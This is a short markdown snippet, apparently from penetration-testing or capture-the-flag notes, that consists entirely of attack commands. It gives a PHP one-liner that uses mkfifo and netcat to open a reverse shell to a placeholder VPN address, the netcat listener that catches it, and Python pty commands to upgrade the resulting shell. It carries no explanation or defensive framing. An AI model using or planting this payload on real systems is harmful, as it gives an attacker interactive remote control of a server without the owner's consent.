```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <VPN-IP>:<VPN-PORT> >/tmp/f"); ?>
```

```bash
nc -lvnp <VPN-PORT>
```
###### Upgrade Shell
```bash
which python3 | which python | which python2
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
